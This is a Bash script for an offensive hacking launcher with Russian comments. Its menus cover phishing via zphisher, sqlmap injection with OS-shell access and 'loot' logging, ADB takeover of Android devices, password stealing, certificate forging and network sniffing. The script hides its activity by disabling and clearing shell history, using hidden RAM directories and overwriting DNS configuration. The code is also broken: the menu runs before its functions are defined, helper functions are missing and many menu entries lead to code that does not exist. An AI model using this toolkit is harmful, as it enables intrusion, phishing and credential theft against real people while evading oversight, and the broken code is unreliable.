#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0m1 ---
CURRENT_VERSION="35.1"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

# --- Инициализация системы ---
# Очистка кэша терминала для стабильной работы
if [ -f "/root/.cache/zcompdump*" ] || [ -f "/root/.zcompdump*" ]; then
    rm -f /root/.cache/zcompdump* 2>/dev/null
    rm -f /root/.zcompdump* 2>/dev/null
fi

CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"

# Настройка DNS для локальных сервисов (например, scanclamavlocal)
if command -v dnsmasq >/dev/null 2>&1; then
    cat << EOD > /etc/dnsmasq.conf
domain-needed
bogus-priv
interface=lo
interface=wlan0
address=/scanclamavlocal/$CURRENT_IP
EOD
    service dnsmasq restart 2>/dev/null || (killall dnsmasq 2>/dev/null && dnsmasq -C /etc/dnsmasq.conf 2>/dev/null)
fi

# --- Вспомогательные функции ---
get_stats() {
    local ram=$(free -m | awk '/Mem:/ {print $3 "/" $2 "MB"}')
    echo -e "${B}IP: ${W}$CURRENT_IP ${G}| ${B}RAM: ${W}$ram${NC}"
}

pause() { echo -e "\n${Y}Press Enter to return...${NC}"; read -r _; }

exit_script() { 
    echo -e "${R}Cleaning history and exiting...${NC}"
    history -c
    exit 0 
}

# --- Универсальный динамический контроллер ---
prime_dynamic_controller() {
    local title="$1"
    local -a labels=($2)
    local -a actions=($3)
    
    while true; do
        clear
        echo -e "${R}========== [ $title ] ==========${NC}"
        get_stats
        echo -e "---------------------------------------"
        
        for ((i=0; i<${#labels[@]}; i++)); do
            printf "${G}%2d) %-18s${NC}" "$((i+1))" "${labels[$i]//_/ }"
            if (( (i+1) % 2 == 0 )); then echo ""; fi
        done
        
        # Если количество элементов нечетное, добавляем перенос строки перед BACK
        if (( ${#labels[@]} % 2 != 0 )); then echo ""; fi
        
        echo -e "\n${Y} B) BACK / EXIT${NC}"
        echo -e "---------------------------------------"
        
        read -p ">> " choice
        if [[ "$choice" == "b" ]] || [[ "$choice" == "B" ]]; then return 0; fi
        
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#labels[@]}" ]; then
            local idx=$((choice-1))
            ${actions[$idx]}
        else
            echo -e "${R}[!] Ошибка: выберите 1-${#labels[@]} или B${NC}"; sleep 1
        fi
    done
}

print_header() {
    local title="$1"
    clear
    echo -e "${R}--------------------------------------------------${NC}"
    # Центрируем текст: 46 символов свободного места в рамке
    # Используем printf для выравнивания
    printf "${R}|%*s%s%*s|${NC}\n" $(((48-${#title})/2)) "" "$title" $(((49-${#title})/2)) ""
    echo -e "${R}--------------------------------------------------${NC}"
}

# Типы: i (info), s (success), e (error), w (warning)
print_status() {
    local type="$1"
    local msg="$2"
    case "$type" in
        "i") echo -e "${B}[*] ${NC}$msg" ;;
        "s") echo -e "${G}[+] ${NC}$msg" ;;
        "e") echo -e "${R}[!] ${NC}$msg" ;;
        "w") echo -e "${Y}[?] ${NC}$msg" ;;
        *) echo -e "$msg" ;;
    esac
}

log_loot() {
    local module="$1"
    local data="$2"
    local file="/root/prime_loot/${module}_results.txt"
    echo "[$(date +%T)] $data" >> "$file"
}

# Аргументы: $1 - тип проверки (cmd, file, port, dir), $2 - цель, $3 - текст ошибки
check_step() {
    local type="$1"
    local target="$2"
    local err_msg="$3"
    local status=1

    case "$type" in
        "cmd") command -v "$target" >/dev/null 2>&1 && status=0 ;;
        "file") [[ -f "$target" ]] && status=0 ;;
        "dir")  [[ -d "$target" ]] && status=0 ;;
        "port") timeout 1 bash -c "cat < /dev/tcp/${target/:/ }" 2>/dev/null && status=0 ;;
    esac

    if [[ $status -ne 0 ]]; then
        print_status "e" "$err_msg"
        return 1
    fi
    return 0
}

ask_confirm() {
    local prompt="$1"
    echo -en "${Y}$prompt (y/n): ${NC}"
    read -r answer
    [[ "$answer" == "y" ]]
}


# Аргументы: $1 - текст вопроса, $2... - варианты (формат "описание:аргументы")
select_option() {
    local prompt="$1"; shift
    print_status "w" "$prompt"
    local count=1
    local options=("$@")

    for opt in "${options[@]}"; do
        echo -e " $count) ${opt%%:*}" # Показываем описание
        ((count++))
    done

    echo -en "${Y}>> ${NC}"
    read -r choice
    
    # Извлекаем аргументы из выбранного варианта
    local index=$((choice - 1))
    if [[ $index -ge 0 && $index -lt ${#options[@]} ]]; then
        echo "${options[$index]#*:}" # Возвращаем часть после двоеточия
    else
        echo "${options[0]#*:}" # По умолчанию первый вариант
    fi
}


# --- Конец  Модулей ---
# --- ГЛАВНОЕ МЕНЮ ---
run_main_menu() {
    local main_names="GHOST_COMMANDER SOCIAL_ENG SQLMAP DEVICE_HACK EXPLOIT_HUB TOTAL_OSINT IBAN_SCAN PWD_GEN CERT_FORGE CERT_READER NET_SCAN_v2 ULTIMATE_EXPLOIT PC_RECOVERY VIEW_LOOT SYSTEM_INFO SERVICE_HUB REPAIR UPDATE_CORE EXIT"
    local main_funcs="run_ghost_commander run_phishing run_sqlmap run_device_hack run_exploit_hub run_smart_osint_engine run_iban_scan run_pwd_gen run_cert_forge run_cert_reader run_heuristic_scanner_v2 run_prime_exploiter_v4 run_pc_recovery_ultimate run_view_loot run_system_info run_servers run_repair update_prime exit_script"
    
    prime_dynamic_controller "PRIME MASTER v$CURRENT_VERSION" "$main_names" "$main_funcs"
}

# --- Точка входа ---
#repair
run_main_menu


# --- Модули: DEVICE & NETWORK ---
run_device_hack() {
    local dh_names="Ghost_Manual TShark_Sniffer Ghost_Auto-Pwn Search_ExploitDB Smart_Audit Bluetooth_Scan"
    local dh_funcs="launch_ghost_manual analyze_network_traffic launch_ghost_autopwn search_exploit_db run_deep_audit scan_bluetooth_devices"
    prime_dynamic_controller "DEVICE & NETWORK HACK" "$dh_names" "$dh_funcs"
}

analyze_network_traffic() {
    local n_names="Host_Monitor HTTP/DNS_Sniffer Traffic_Record"
    local n_funcs="run_host_monitor run_http_dns_sniffer run_traffic_record"
    prime_dynamic_controller "TSHARK ANALYZER" "$n_names" "$n_funcs"
}

# --- Модули: RECOVERY & PASSWORDS ---
pc_password_recovery() {
    local p_names="Extract_Reset_OS_Password Heuristic_Scan"
    local p_funcs="run_pc_recovery_ultimate smart_threat_scan"
    prime_dynamic_controller "PC RECOVERY & FORENSIC" "$p_names" "$p_funcs"
}

# --- EXPLOIT HUB ---
run_exploit_hub() {
    local ex_names="PhoneSploit_Pro SQLmap/Web PC/Network_Scan PC_Control"
    local ex_funcs="ex_phonesploit_pro run_sqlmap_smart ex_pc_network_scan run_pc_control"
    prime_dynamic_controller "EXPLOIT HUB" "$ex_names" "$ex_funcs"
}

run_pc_control() {
    local pc_names="Payload_Generator Password_Stealer Post-Exploit"
    local pc_funcs="pc_gen_payload pc_steal_creds pc_post_exploit"
    prime_dynamic_controller "PC CONTROL" "$pc_names" "$pc_funcs"
}

# --- SECURITY & DATA HUB ---
run_servers() {
    local s_names="AV-Scanner Share-File Upload-Inbound"
    local s_funcs="run_av_srv run_share_srv run_upload_srv"
    prime_dynamic_controller "SECURITY & DATA HUB" "$s_names" "$s_funcs"
}


# --- Модули по меню ---
run_ghost_commander() {
    print_header "GHOST COMMANDER (ANDROID/IOT)"

    # 1. Валидация наличия
    local GHOST_PATH=$(find /root /home /opt /sdcard -maxdepth 2 -type d -name "Ghost" 2>/dev/null | head -n1)
    check_step "dir" "$GHOST_PATH" "Ghost Framework not found." || { pause; return; }

    echo -en "${Y}Enter Target IP ${W}(Leave empty for Manual Console)${Y}: ${NC}"
    read -r TARGET_IP

    # 2. Ручной режим (универсальный запуск)
    check_empty_run "$TARGET_IP" "$GHOST_PATH" "python3 -m ghost" && return

    # 3. Автоматический режим: Проверка связи
    print_status "i" "Pre-scanning target $TARGET_IP:5555..."
    
    # Используем check_step для порта и ask_confirm для логики пропуска ошибок
    check_step "port" "$TARGET_IP:5555" "Port 5555 (ADB) is closed." || \
    ask_confirm "Force connection attempt?" || return

    # 4. Исполнение
    print_status "s" "Executing Auto-Connect to $TARGET_IP..."
    log_loot "ghost" "Connection attempt: $TARGET_IP"
    
    (cd "$GHOST_PATH" && python3 -m ghost --execute "connect $TARGET_IP")

    pause
}


run_phishing() {
    print_header "SOCIAL ENGINEERING HUB"

    # Ищем путь
    local Z_PATH=$(find /root /home /opt -maxdepth 2 -type d -name "zphisher" 2>/dev/null | head -n1)

    # Проверяем всё одной цепочкой. Если хоть один шаг вернет 1, выполнение остановится.
    check_step "dir" "$Z_PATH" "ZPhisher not found." || { pause; return; }
    check_step "cmd" "php" "PHP is required but not installed." || { pause; return; }

    print_status "s" "All checks passed. Launching..."
    ( cd "$Z_PATH" && ./zphisher.sh )
    pause
}


run_sqlmap() {
    print_header "SMART SQL INJECTION (SQLMAP)"

    # Валидация
    check_step "cmd" "sqlmap" "SQLmap is not installed." || { pause; return; }

    echo -en "${Y}Enter Target URL ${W}(Leave empty for Wizard)${Y}: ${NC}"
    read -r target_url

    # Ручной режим через универсальную функцию
    check_empty_run "$target_url" "/tmp" "sqlmap --wizard" && return

    # Проверка порта (убираем явный if через операторы || и &&)
    check_step "port" "${target_url#*//}:80" "Target host is unreachable." || \
    ask_confirm "Host seems down. Force start?" || return

    # Динамический выбор агрессивности (заменяет весь блок case и кучу echo)
    local mode_args=$(select_option "Select Aggression Level:" \
        "Stealth (L1, R1):--level 1 --risk 1" \
        "Advanced (L3, R2):--level 3 --risk 2 --threads 5" \
        "Insane (L5, R3):--level 5 --risk 3 --threads 10 --flush-session")

    # Стелс-настройка
    local tmp_dir="/dev/shm/.p_sql_$RANDOM"
    mkdir -p "$tmp_dir"
    local base_args="--batch --random-agent --dbms=auto --shell --output-dir=$tmp_dir --answers='quit=N,follow=Y'"

    print_status "i" "Launching Engine with $mode_args..."
    
    # Выполнение
    sqlmap -u "$target_url" $base_args $mode_args

    # Анализ и Лут
    local log_file=$(find "$tmp_dir" -name "log" -type f 2>/dev/null)
    check_step "file" "$log_file" "No vulnerabilities detected." && {
        print_status "s" "VULNERABILITY CONFIRMED!"
        log_loot "sqlmap" "SUCCESS: $target_url"
        grep -E "Target|Payload|Type" "$log_file" | tail -n 5 >> /root/prime_loot/sql_success.txt
        print_status "s" "Results saved to loot."
    }

    # Зачистка
    rm -rf "$tmp_dir"
    print_status "i" "RAM Purge Complete."
    pause
}


run_host_monitor() {
    print_header "NETWORK HOST MONITOR"

    # Валидация tshark и интерфейса
    check_step "cmd" "tshark" "TShark not installed." || { pause; return; }
    local iface=$(ip route | grep default | awk '{print $5}' || echo "wlan0")
    
    print_status "i" "Monitoring traffic on: $iface (Press CTRL+C to stop)"
    print_status "w" "Filtering Unique Connections..."

    # Запуск tshark с агрегацией данных в реальном времени
    tshark -i "$iface" -n -T fields -e ip.src -e ip.dst -E separator=" -> " 2>/dev/null | stdbuf -oL uniq
    
    pause
}

run_http_dns_sniffer() {
    print_header "HTTP & DNS SNIFFER"

    check_step "cmd" "tshark" "TShark not installed." || { pause; return; }
    local iface=$(ip route | grep default | awk '{print $5}' || echo "wlan0")

    print_status "s" "Sniffing Queries on $iface..."
    log_loot "sniffer" "Session started on $iface"

    # Фильтруем только запросы, убирая лишние поля
    tshark -i "$iface" -Y "http.request || dns.flags.response == 0" \
           -T fields -e http.host -e dns.qry.name 2>/dev/null \
           | stdbuf -oL awk NF | stdbuf -oL uniq
    
    pause
}

run_traffic_record() {
    print_header "TRAFFIC RECORDING (PCAP)"

    check_step "cmd" "tshark" "TShark not installed." || { pause; return; }
    
    local report_dir="/root/reports"
    [[ ! -d "$report_dir" ]] && mkdir -p "$report_dir"

    local filename="$report_dir/capture_$(date +%H%M).pcap"
    local iface=$(ip route | grep default | awk '{print $5}' || echo "wlan0")

    # Выбор режима записи
    local duration=$(select_option "Set Record Duration:" \
        "Quick (1 min):60" \
        "Medium (5 min):300" \
        "Deep (15 min):900")

    print_status "i" "Recording traffic on $iface..."
    print_status "s" "Output: $filename"
    print_status "w" "Recording will stop after $duration seconds or CTRL+C"

    # Запуск записи с авто-стопом
    tshark -i "$iface" -a duration:"$duration" -w "$filename" 2>/dev/null

    check_step "file" "$filename" "Failed to create PCAP file." && \
    print_status "s" "Capture saved successfully."
    
    pause
}

